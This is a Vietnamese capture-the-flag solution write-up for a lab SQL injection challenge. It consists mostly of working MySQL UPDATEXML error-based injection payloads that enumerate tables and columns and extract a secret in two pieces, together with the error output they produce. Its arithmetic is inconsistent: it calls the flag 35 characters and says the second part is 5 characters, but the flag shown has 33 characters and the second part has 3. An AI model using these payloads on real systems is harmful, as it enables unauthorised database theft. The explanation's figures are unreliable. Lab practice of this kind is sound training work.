# SQLi-010 Solution

## Thông Tin Challenge

- **Kỹ thuật:** MySQL UPDATEXML() Error-based SQLi
- **Giới hạn:** UPDATEXML chỉ hiển thị tối đa **32 ký tự** trong error message
- **Flag length:** 35 ký tự → Cần extract theo **2 lần**

## 🔍 Detection & Enumeration

### 1. Test Vulnerability

```sql
1' AND UPDATEXML(1,CONCAT(0x7e,version(),0x7e),1)--
```

### 2. Enumerate Tables

```sql
1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e),1)--
```

### 3. Enumerate Columns

```sql
1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='secrets' LIMIT 0,1),0x7e),1)--
```

## 🎯 Extract Flag (2 Phần)

### Payload 1: Lấy 30 ký tự đầu

```sql
1' AND UPDATEXML(1,CONCAT(0x7e,SUBSTRING((SELECT value FROM secrets),1,30),0x7e),1)--
```

**Kết quả:**

```
XPATH syntax error: '~FLAG{upd4t3xml_t4bl3_3num3r4t1~'
```

→ Phần 1: `FLAG{upd4t3xml_t4bl3_3num3r4t1`

### Payload 2: Lấy phần còn lại (từ ký tự 31)

```sql
1' AND UPDATEXML(1,CONCAT(0x7e,SUBSTRING((SELECT value FROM secrets),31,30),0x7e),1)--
```

**Kết quả:**

```
XPATH syntax error: '~0n}~'
```

→ Phần 2: `0n}`

## 🏁 Flag

```
FLAG{upd4t3xml_t4bl3_3num3r4t10n}
```

## 📝 Giải Thích

**Tại sao cần 2 lần?**

- UPDATEXML giới hạn error message ở **32 ký tự** (bao gồm cả delimiter `~`)
- Số ký tự data thực tế: `32 - 2 = 30 ký tự`
- Flag dài 35 ký tự → Phải chia làm 2 phần:
  - Phần 1: `SUBSTRING(..., 1, 30)` → 30 ký tự đầu
  - Phần 2: `SUBSTRING(..., 31, 30)` → 5 ký tự cuối

**Syntax SUBSTRING:**

```sql
SUBSTRING(string, start_position, length)
```

- `start_position`: Vị trí bắt đầu (index từ 1)
- `length`: Số ký tự cần lấy
